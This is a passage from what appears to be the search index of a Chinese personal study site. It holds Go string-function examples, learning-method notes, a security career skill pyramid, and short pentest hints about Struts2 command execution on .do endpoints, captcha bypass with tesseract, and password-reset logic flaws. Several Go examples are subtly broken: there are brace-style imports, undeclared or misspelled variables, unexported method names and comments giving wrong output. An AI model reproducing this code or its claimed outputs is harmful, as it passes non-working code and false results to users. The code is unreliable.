daxie\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_5","title":"\u53bb\u4e24\u8fb9","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    name := \"\u8fb9\u53bb\u5904\u5566\u8fb9\"\n\n    result1 := strings.TrimRight(name, \"\u8fb9\")     //\u53bb\u9664\u53f3\u8fb9\u7684\u8fb9\n    result2 := strings.TrimLeft(name, \"\u8fb9\")      //\u53bb\u9664\u5de6\u8fb9\u7684\u8fb9\n    result3 := strings.Trim(name, \"\u8fb9\")      //\u53bb\u9664\u4e24\u8fb9\u7684\u8fb9\n\n    fmt.Println(result1, result2, result3)      //\u8f93\u51fa\uff1a\u8fb9\u53bb\u9664\u5566 \u53bb\u9664\u5566\u8fb9 \u8fb9\u53bb\u9664\u5566\n}\n//\u6ce8\u610f\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_6","title":"\u66ff\u6362","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    name := \"tionaction\"\n\n    result1 := strings.Replace(name, \"tion\", \"RT\", 1)       //\u627e\u5230tion\uff0c\u4ece\u5de6\u5230\u53f3\u627e\u7b2c\u4e00\u4e2a\u66ff\u6362\n    result2 := strings.Replace(name, \"tion\", \"RT\", 2)       //\u627e\u5230tion,\u4ece\u5de6\u5230\u53f3\u627e\u524d\u4e24\u4e2a\u66ff\u6362\n    result3 := strings.Replace(name, \"tion\", \"RT\", -1)      //\u627e\u5230tion\u66ff\u6362\u4e3aRT, \u66ff\u6362\u6240\u6709\n\n    fmt.Println(result1, result2, result3)\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_7","title":"\u5206\u5272","text":"<pre><code>package main\n\nimport {\n    \"fmt\"\n    \"strings\"\n}\n\nfunc main() {\n    name := \"\u62ac\u8001\u5b50\u7684\u610f\u5927\u5229\u70ae\u6765\"\n    result := strings.Split(name, \"\u7684\")\n\n    //\u6839\u636e '\u7684' \u8fdb\u884c\u5207\u5272\uff0c\u83b7\u53d6\u4e00\u4e2a\u5207\u7247\uff08\u7c7b\u4f3c\u4e00\u4e2a\u6570\u7ec4\uff09\n    fmt.Println(result)     //[\u62ac\u8001\u5b50, \u610f\u5927\u5229, \u70ae\u6765]\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_8","title":"\u62fc\u63a5","text":"<pre><code>package main\n\nimport {\n    \"bytes\"\n    \"fmt\"\n    \"strings\"\n}\n\nfunc main() {\n    message := \"\u6211\u7231\" + \"\u5317\u4eac\u5929\u5b89\u95e8\"\n    fmt.Println(message)        //\u6548\u7387\u4f4e\n\n    datalist := []string{\"\u6211\u7231\", \"\u5317\u4eac\u5929\u5b89\u95e8\"}\n    result = strings.Join(datalist, \"-\")        //\u4f7f\u7528\u5206\u9694\u7b26\n    fmt.Println(datalist)       //\u6211\u7231-\u5317\u4eac\u5929\u5b89\u95e8\n\n    //1.10\u4e4b\u524d\u4f7f\u7528\n    var buffer bytes.Buffer\n    buffer.writeString(\"\u6211\u662f\")\n    buffer.writeString(\"\u6c99\u96d5\")\n    buffer.writeString(\"\u7684\u7238\u7238\")\n    data := buffer.String()\n    fmt.Println(data)\n    //1.10\u4e4b\u540e\u4f7f\u7528 \u6548\u7387\u9ad8\n    var builder strings.Builder\n    builder.writeString(\"\u54c8\u54c8\u54c8\")\n    builder.writeString(\"\u6211\u53ea\u4f1a\u5475\u5475\u5475\")\n    value := builder.String()\n    fmt.Println(value)      //\u54c8\u54c8\u54c8\u6211\u53ea\u4f1a\u5475\u5475\u5475\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#stringint","title":"string\u8f6c\u6362\u4e3aint","text":"<pre><code>package main\n\nimport {\n    \"fmt\"\n    \"strconv\"\n}\n\nfunc main() {\n    num := \"666\"\n    //\u5185\u90e8\u8c03\u7528\u7684\u5c31\u662f ParseInt\n    var data, _ = strconv.Atoi(num)\n    fmt.Println(data)\n\n    //\u6574\u578b\u8f6c\u5b57\u7b26\u4e32 (strconv.ParseInt \u548c strconv.FormatInt\u53ef\u7528\u4e8e\u5904\u7406\u8fdb\u5236\u8f6c\u6362)\n    var result, err = strconv.ParseInt(num, 10, 32)\n    fmt.Println(result, err)\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#intstring","title":"int\u8f6c\u6362\u4e3astring","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strconv\"\n)\n\nfunc main() {\n    var result = strconv.Itoa(888)\n    fmt.Println(result)\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_9","title":"\u5b57\u7b26\u4e32\u548c \"\u5b57\u8282\u96c6\u5408\"","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strconv\"\n    \"unicode/utf8\"\n)\n\nfunc main() {\n    var name string = \"\u5c0f\u6811\u6797\"\n\n  //\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u4e00\u4e2a \"\u5b57\u8282\u96c6\u5408\"\n  byteSet := []byte(name)\n  fmt.Println(byteSet)\n\n  //\u5b57\u8282\u7684\u96c6\u5408\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n  byteList := []byte{230,173,136,178,155,233,189,142}\n  targetString := string(byteList)\n  fmt.Println(targetString)\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#rune","title":"\u5b57\u7b26\u4e32\u548c \"rune\u96c6\u5408\"","text":"<pre><code>package main\n\nimport (\n  \"fmt\"\n  \"strconv\"\n  \"unicode/utf8\"\n)\n\nfunc main() {\n  var name string = \"wulawula\"\n\n  //\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3aunicode\u5b57\u7b26\u7801\u70b9\u7684\u96c6\u5408\n  temSet := []rune(name)\n  fmt.Println(tempSet)\n  fmt.Println(temSet[0],strconv.FormatInt(int64(tempSet[0]), 16))\n  fmt.Println(temSet[1],strconv.FormatInt(int64(tempSet[1]), 16))\n  fmt.Println(temSet[2],strconv.FormatInt(int64(tempSet[2]), 16))\n\n  //\"rune\u96c6\u5408\" \u8f6c\u6362\u4e3a \u5b57\u7b26\u4e32\n  runeList := []rune{27493, 27804, 40784}\n  targetName := string(runeList)\n  fmt.Println(targetName)\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#string","title":"string \u548c \u5b57\u7b26","text":"<pre><code>package main\n\nimport (\n  \"fmt\"\n  \"unicode/utf8\"\n)\n\nfunc main() {\n  v1 := string(65)\n  fmt.Println(v1)       //A\n\n  v2, size := utf8.DecodeRuneInString(\"A\")\n  fmt.Println(v3, size) //6\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/","title":"\u5b66\u4e60\u8fc7\u7a0b","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_1","title":"\u5fc3\u6001","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_2","title":"\u601d\u7ef4\u65b9\u5f0f","text":"<p>\u4fe1\u606f\u5b89\u5168\u9886\u57df\u662f\u5de8\u5927\u7684\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u4ec0\u4e48\u90fd\u5b66\u3002 \u5fc5\u987b\u5feb\u901f\u53bb\u5b66\u4e60\u5e76\u7406\u89e3\u4e0d\u540c\u7684\u6280\u672f\u539f\u7406(understand these principles)\u3001\u7ed3\u6784(structures)\u3001\u548c\u6d41\u7a0b(processes)</p> <p>\u9047\u5230\u65e0\u6cd5\u7406\u89e3\u7684\u4e8b\u7269\uff0c\u662f\u597d\u4e8b\uff0c\u6211\u4eec\u5fc5\u987b\u627e\u51fa\u8fd9\u4e9b\u4e8b\u7269</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_3","title":"\u5b66\u4e60\u5a92\u4ecb","text":"<p>\u4ee5\u5b66\u4e60\u4e3a\u4e2d\u5fc3\u7684\u4fe1\u606f\u5b89\u5168\u793e\u533a</p> <p>\u8bb8\u591a\u4eba\u4e0d\u77e5\u9053\u4ed6\u4eec\u7684\u5b9e\u9645\u6280\u80fd\u548c\u77e5\u8bc6\u6c34\u5e73 \u5f00\u53d1(developing)\u6211\u4eec\u7684\u7814\u7a76\u65b9\u6cd5(research methodology)\u3001\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u5982\u4f55\u4f7f\u7528\u5b83\u6765\u63d0\u9ad8\u6211\u4eec\u7684\u77e5\u8bc6\uff0c\u8fd9\u9700\u8981\u5927\u91cf<code>\u5b9e\u8df5</code>(\u4e3b\u52a8\u5b66\u4e60)\uff0c\u4ee5\u8fbe\u5230\u5feb\u901f\u5b66\u4e60\u5e76\u9002\u5e94\u6211\u4eec\u5de5\u4f5c\u7684\u73af\u5883</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_4","title":"\u601d\u8def","text":"<p>\u5b66\u4e60\u5982\u4f55 find, choose, adapt \u6211\u4eec\u9700\u8981\u7684\u4fe1\u606f\u3002\u4ee5\u53ca\u5982\u4f55\u5b66\u4e60\uff1f     \u521b\u9020\u6027\u601d\u7ef4 <code>\u8df3\u51fa\u6846\u6846\u601d\u8003(Outside the box)</code> \u6709\u52a9\u4e8e\u8de8\u8d8a\u60f3\u8c61\u7684\u754c\u9650\uff0c\u4ece\u800c\u4f7f\u6211\u4eec\u83b7\u5f97\u8d77\u521d\u65e0\u6cd5\u8bc6\u522b\u7684\u53ef\u80fd\u6027\u548c\u9009\u62e9\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_5","title":"\u5965\u5361\u59c6\u5243\u5200","text":"<p>\u5bf9\u4e8e\u76f8\u540c\u7684\u4e8b\u5b9e\u72b6\u6001\uff0c\u6700\u7b80\u5355\u76f4\u63a5\u7684\u7406\u8bba\u4f18\u4e8e\u5176\u4ed6\u6240\u6709\u53ef\u80fd\u7684\u5145\u5206\u89e3\u91ca\u3002 \u6700\u7b80\u5355\u7684\u89e3\u91ca\u603b\u662f\u6700\u53ef\u80fd\u7684</p> <p>\u4fdd\u6301\u4e0d\u53d8\u7684\u6982\u5ff5\u662f\u6211\u4eec\u5b66\u4e60\u65b0\u4e3b\u9898\u65f6\u7684\u91cd\u70b9</p> <p>\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e2a\u4eba\u90fd\u4f1a\u8ba8\u8bba\u53ef\u80fd\u53d1\u751f\u7684\u60c5\u51b5\u4ee5\u53ca\u5982\u4f55\u6700\u597d\u7684\u5904\u7406\u5b83\u4eec <code>\u6e17\u900f\u6d4b\u8bd5\u7684\u6700\u4f73\u65b9\u6cd5\uff0c\u4f7f\u7528\u53ef\u4ee5\u83b7\u5f97\u7684\u4fe1\u606f</code></p> <p>\u5982\u4f55\u83b7\u53d6\u548c\u4f7f\u7528\u8fd9\u4e9b\u4fe1\u606f\u7684\u72ec\u7279\u6280\u672f\u662f\u9075\u5faa\u4e8e\u5404\u4e2a\u6b65\u9aa4\uff0c\u800c\u4e0d\u662f\u6574\u4e2a\u6982\u5ff5\u3002\u4e00\u65e6\u83b7\u53d6\u4e86\u6574\u4f53\u60c5\u51b5\uff0c\u9002\u5e94\u7ed9\u5b9a\u7684\u60c5\u51b5\u548c\u6761\u4ef6\u5c31\u4f1a\u5bb9\u6613\u5f97\u591a\u3002 \u4e0d\u5149\u53ea\u5b66\u4e60\u83b7\u53d6\u4fe1\u606f\u7684\u5404\u4e2a\u6b65\u9aa4\uff0c\u8fd8\u8981\u4e86\u89e3\u8fd9\u4e9b\u4fe1\u606f\u7ec4\u5408\u8d77\u6765\u5982\u4f55\u5229\u7528\u3002 \u5bfb\u627e\u901a\u5f80\u5b83\u7684\u65b9\u6cd5 \u539f\u6587\uff1a     The unique techniques of how we get and use this information are, again, individual steps followed and not the whole concept. The same applies to most exploitation attacks and the individual steps for them. Once we understand the overall picture, adapting to the given situations and conditions is much easier. However, suppose we have only learned the individual steps. In that case, we will have difficulty adapting them to new situations because we do not understand their impact on the systems and their applications.</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#learning-dependencies","title":"\u5b66\u4e60\u4f9d\u8d56(Learning Dependencies)","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_6","title":"\u5b66\u4e60\u65b9\u5f0f","text":"<p><code>Outside the box</code> \u9047\u5230\u4e0d\u7406\u89e3\u7684\u67d0\u4e9b\u4e8b\u60c5\u65f6\uff0c\u4fdd\u6301\u826f\u597d\u7684\u60c5\u7eea\uff0c\u95ee\u9898\u5c31\u53ea\u662f\u4e00\u79cd\u60c5\u51b5\u3002 <code>Know your goal</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_7","title":"\u5b66\u4e60\u6548\u7387","text":"<p><code>combination</code>  \u5c06\u6211\u4eec\u7684\u77e5\u8bc6\u4e0e\u65b0\u4fe1\u606f\u7ec4\u5408\u5e76\u9002\u5e94</p> <p>20%\u7684\u52aa\u529b\uff0c\u83b7\u53d680%\u7684\u6548\u679c</p> <p>\u5982\u4f55\uff1a \u5b66\u7684\u66f4\u5feb \u6784\u5efa\u6211\u4eec\u7684\u77e5\u8bc6 \u627e\u5230\u6211\u4eec\u9700\u8981\u7684\u4fe1\u606f \u83b7\u53d6\u6982\u89c8</p> <p>\u5b66\u4e60\u91d1\u5b57\u5854</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_8","title":"\u8fc7\u7a0b","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_9","title":"\u91cd\u70b9","text":"<p>\u953b\u70bc\u671f\u95f4\u9700\u8981\u5b8c\u5168\u4e13\u6ce8\uff0c</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/#_10","title":"\u5927\u8111","text":"<p>\u901a\u8fc7\u7a0d\u5fae\u590d\u6742\uff0c\u8d39\u8111\u5b50\u7684\u6587\u7ae0\u6216\u4e66\u7c4d\u53bb\u953b\u70bc \u8ba9\u5927\u8111\u4e60\u60ef\u4e8e\u8fd9\u79cd\u52a8\u8111\u65b9\u5f0f</p> <p>\u5982\u4f55\u53bb\u8bad\u7ec3 \u627e\u5230\u4e00\u4e2a<code>\u6700\u5c0f\u6210\u679c</code> <code>\u5c0f\u76ee\u6807</code> \u96c6\u4e2d\u7cbe\u529b\u53bb\u653b\u514b \u901a\u8fc7\u67e5\u9605\u8d44\u6599 \u4e3b\u9898\u9605\u8bfb \u8bf7\u6559\u4ed6\u4eba\uff0c\u76f4\u5230\u53ef\u4ee5\u8f7b\u677e\u7684\u5c06\u5b83\u8f93\u51fa\u3002\u7136\u540e\u8fdb\u884c\u4e0b\u4e00\u6b65\u5b66\u4e60</p> <p>\u79ef\u6781\u60c5\u7eea \u53bb\u9009\u62e9 \u751f\u6d3b\u5706\u6ee1 \u8eab\u4f53\u5065\u5eb7</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/","title":"\u5b89\u5168\u884c\u4e1a\u7814\u7a76","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#2021","title":"2021\u5de5\u4e1a\u4e92\u8054\u7f51\u5b89\u5168\u53d1\u5c55\u4e0e\u5b9e\u8df5\u5206\u6790\u62a5\u544a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#app","title":"App\u8fdd\u89c4\u6536\u96c6\u4e2a\u4eba\u4fe1\u606f\u98ce\u9669\u5206\u6790\u62a5\u544a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#2021_1","title":"2021\u4e2d\u56fd\u7f51\u7ad9\u5b89\u5168\u62a5\u544a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#2021_2","title":"\u5947\u5b89\u4fe1\u96c6\u56e22021\u4f01\u4e1a\u793e\u4f1a\u8d23\u4efb\u62a5\u544a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#2022","title":"2022\u4e2d\u56fd\u6570\u5b57\u57ce\u5e02\u5b89\u5168\u8fd0\u8425\u73b0\u72b6\u5206\u6790\u62a5\u544a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#2021_3","title":"2021\u4e2d\u56fd\u4f01\u4e1a\u90ae\u7bb1\u5b89\u5168\u6027\u7814\u7a76\u62a5\u544a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#2022_1","title":"2022\u533b\u7597\u536b\u751f\u884c\u4e1a\u7f51\u7edc\u5b89\u5168\u5206\u6790\u62a5\u544a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#2022_2","title":"2022\u5e74\u4e0a\u534a\u5e74\u7f51\u7edc\u5b89\u5168\u5e94\u6025\u54cd\u5e94\u5206\u6790\u62a5\u544a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#2022_3","title":"2022\u4e2d\u56fd\u8f6f\u4ef6\u4f9b\u5e94\u94fe\u5b89\u5168\u5206\u6790\u62a5\u544a","text":"<p>\u65e5\u5e38\u8fd0\u8425\u65b9\u5411\uff1a\u6f0f\u6d1e\u626b\u63cf\u548c\u9a8c\u8bc1\u3001\u5b89\u5168\u8fd0\u7ef4\u3001\u5a01\u80c1\u5206\u6790\u3001\u7ec8\u7aef\u5b89\u5168\u2026\u2026</p> <p>\u5b89\u5168\u653b\u9632\u65b9\u5411\uff1a\u672a\u77e5\u5a01\u80c1\u7684\u53d1\u73b0\u3001\u6e17\u900f\u6d4b\u8bd5\u3001\u5e94\u6025\u54cd\u5e94\u3001\u4ee3\u7801\u5ba1\u8ba1\u2026\u2026</p> <p>\u5b89\u5168\u7ba1\u7406\u65b9\u5411\uff1a\u5b89\u5168\u5408\u89c4\u3001\u5b89\u5168\u8bc4\u4f30\u3001\u5b89\u5168\u89c4\u5212\u3001\u98ce\u9669\u7ba1\u7406\u2026\u2026</p> <p>\u7814\u53d1\u6d4b\u8bd5\u65b9\u5411\uff1a\u5b89\u5168\u5f00\u53d1\u3001\u4ee3\u7801\u5b89\u5168\u3001\u7ec4\u4ef6\u6d4b\u8bd5\u3001\u4e1a\u52a1\u6d4b\u8bd5\u2026\u2026</p> <p>\u7f51\u7edc\u5b89\u5168\u4eba\u624d\u80fd\u529b\u91d1\u5b57\u5854\u201d\uff0c\u5176\u4e2d\u80fd\u529b\u81ea\u4e0b\u800c\u4e0a\uff0c\u53ef\u4ee5\u5206\u4e3a\u56db\u5c42\uff1a\u57fa\u7840\u77e5\u8bc6\u3001\u4e13\u4e1a\u6280\u80fd\u3001\u5de5\u7a0b\u5b9e\u8df5\u4e0e\u7efc\u5408\u80fd\u529b\u3002 \u57fa\u7840\u77e5\u8bc6</p> <p>\u6307\u7684\u662f\u76f8\u5e94\u5c97\u4f4d\u4eba\u624d\u4e3a\u5b8c\u6210\u5de5\u4f5c\u4efb\u52a1\u6240\u5e94\u5177\u5907\u7684\u57fa\u7840\u77e5\u8bc6\u5e94\u7528\u7684\u6c34\u5e73\uff0c\u4e3b\u8981\u5305\u62ec\u57fa\u7840\u8ba1\u7b97\u673a\u77e5\u8bc6\u4e0e\u5bf9\u5e94\u57fa\u672c\u7406\u8bba\u3002\u5927\u591a\u7f51\u7edc\u5b89\u5168\u76f8\u5173\u5c97\u4f4d\u90fd\u9700\u8981\u57fa\u7840\u77e5\u8bc6\u4e3a\u57fa\u7840\uff0c\u6ca1\u6709\u4e00\u822c\u8ba1\u7b97\u673a\u65b9\u5411\u57fa\u7840\u77e5\u8bc6\u7684\u6c89\u6dc0\u5f88\u96be\u8fdb\u4e00\u6b65\u638c\u63e1\u7b2c\u4e8c\u5c42\u4e13\u4e1a\u6280\u80fd\u6280\u80fd\u3002 \u4e13\u4e1a\u6280\u80fd</p> <p>\u901a\u7528\u77e5\u8bc6\uff0c\u5305\u62ec\uff1a\u5b89\u5168\u5de5\u5177\u4f7f\u7528\u3001\u6f0f\u6d1e\u539f\u7406\u5229\u7528\u3001\u9006\u5411\u5206\u6790\u6280\u672f\u7b49</p> <p>\u5de5\u7a0b\u5b9e\u8df5</p> <p>\u5b9e\u9645\u5de5\u7a0b\u4e0e\u9879\u76ee\u63a8\u8fdb\u4e2d\u5e94\u5177\u5907\u7684\u7ecf\u9a8c\u3002\u82e5\u60f3\u8fdb\u5165\u5b89\u5168\u653b\u9632\u65b9\u5411\u548c\u4e00\u822c\u5b89\u5168\u7ba1\u7406\u5c42\uff0c\u8fd8\u9700\u8981\u638c\u63e1\u7b2c\u4e09\u5c42\u5de5\u7a0b\u5b9e\u8df5\u80fd\u529b\uff0c\u5982\uff1a\u5b89\u5168\u8bbe\u5907\u914d\u7f6e\u3001\u5185\u7f51\u6e17\u900f\u80fd\u529b\u3001\u5b9e\u6218\u653b\u9632\u80fd\u529b\u7b49</p> <p>\u7efc\u5408\u80fd\u529b</p> <p>\u6ee1\u8db3\u5b8c\u6210\u5de5\u4f5c\u4efb\u52a1\u6240\u5e94\u5177\u5907\u7684\u884c\u4e3a\u7279\u5f81\u548c\u7efc\u5408\u7d20\u8d28\u3002\u60f3\u8981\u5c1d\u8bd5\u5b89\u5168\u7ba1\u7406\u65b9\u5411\uff08\u5982\uff1a\u5b89\u5168\u5408\u89c4\u3001\u5b89\u5168\u8bc4\u4f30\u3001\u5b89\u5168\u89c4\u5212\u3001\u98ce\u9669\u7ba1\u7406\u7b49\uff09\u7684\u804c\u4f4d\u6216\u5176\u4ed6\u65b9\u5411\u9ad8\u7ea7\u7ba1\u7406\u5c97\u4f4d\u9700\u8981\u66f4\u9ad8\u7684\u7efc\u5408\u80fd\u529b\uff0c\u5982\uff1a\u5b89\u5168\u7ba1\u7406\u80fd\u529b\u3001\u653f\u7b56\u6cd5\u89c4\u4e86\u89e3\u3001\u60c5\u62a5\u6536\u96c6\u80fd\u529b\u3001\u81ea\u6211\u5b66\u4e60\u80fd\u529b\u7b49 ![[Pasted image 20221010154346.png]]</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#_1","title":"\u57fa\u7840\u77e5\u8bc6","text":"<p>\u7f16\u7a0b\u8bed\u8a00</p> <p>\u5e94\u7528\u7a0b\u5e8f\u5e95\u5c42\u5de5\u4f5c\u539f\u7406</p> <p>\u6570\u636e\u5e93</p> <p>\u6570\u636e\u7ed3\u6784</p> <p>\u7b97\u6cd5</p> <p>\u4e3b\u6d41\u5f00\u53d1\u6846\u67b6</p> <p>\u8f6f\u786c\u4ef6\u7cfb\u7edf\u5f00\u53d1</p> <p>\u6570\u636e\u5206\u6790</p> <p>TCP/IP\u534f\u8bae</p> <p>\u4ee3\u7801\u9605\u8bfb\u903b\u8f91\u5206\u6790</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#_2","title":"\u4e13\u4e1a\u77e5\u8bc6","text":"<p>\u7f51\u7edc\u6e17\u900f</p> <p>\u6e17\u900f\u6d4b\u8bd5</p> <p>\u6f0f\u6d1e\u539f\u7406</p> <p>\u9006\u5411\u5206\u6790</p> <p>web\u5b89\u5168</p> <p>\u4e2d\u95f4\u4ef6\u5b89\u5168</p> <p>\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168</p> <p>\u6570\u636e\u5e93\u5b89\u5168</p> <p>\u75c5\u6bd2\u4e0e\u6728\u9a6c</p> <p>\u5b89\u5168\u5de5\u5177</p> <p>\u5bc6\u7801\u5b66</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#_3","title":"\u5de5\u7a0b\u5b9e\u8df5","text":"<p>\u5b89\u5168\u7b56\u7565</p> <p>\u6f0f\u6d1e\u89e3\u6790</p> <p>\u5165\u4fb5\u68c0\u6d4b</p> <p>\u6570\u636e\u6316\u6398</p> <p>\u6eaf\u6e90\u5206\u6790</p> <p>\u8bbe\u5907\u914d\u7f6e</p> <p>\u6f0f\u6d1e\u5904\u7406</p> <p>\u5b9e\u6218\u653b\u9632</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E7%A0%94%E7%A9%B6/#_4","title":"\u7efc\u5408\u80fd\u529b","text":"<p>\u60c5\u62a5\u6536\u96c6</p> <p>\u719f\u77e5\u6cd5\u89c4\u653f\u7b56\u6807\u51c6</p> <p>\u5b89\u5168\u7ba1\u7406</p> <p>\u72ec\u7acb\u89e3\u51b3\u6280\u672f\u96be\u9898</p> <p>\u4e86\u89e3\u884c\u4e1a\u53d1\u5c55\u8d8b\u52bf\u3001\u524d\u6cbf\u6280\u672f</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%89%8B%E6%B3%95/","title":"\u624b\u6cd5","text":"<p>\u6587\u7ae0\u94fe\u63a5\uff1ahttps://www.freebuf.com/vuls/211842.html</p> <p>.do\u63a5\u53e3\u5730\u5740 JAVA \u8bed\u8a00 \u8054\u60f3\u5230 Struts2 \u547d\u4ee4\u6267\u884c\uff0c\u53ef\u4f7f\u7528Struts2\u6f0f\u6d1e\u9a8c\u8bc1\u5de5\u5177\u626b\u63cf</p> <p>\u9a8c\u8bc1\u7801\u7ed5\u8fc7 python\u8c03\u7528 tesseract \u8bc6\u522b\u56fe\u7247 \u653b\u51fb\u56fe\u7247\u9a8c\u8bc1\u7801</p> <p>\u5ba1\u67e5\u5bc6\u7801\u627e\u56de\u529f\u80fd \u5bb9\u6613\u51fa\u73b0\u903b\u8f91\u9519\u8bef 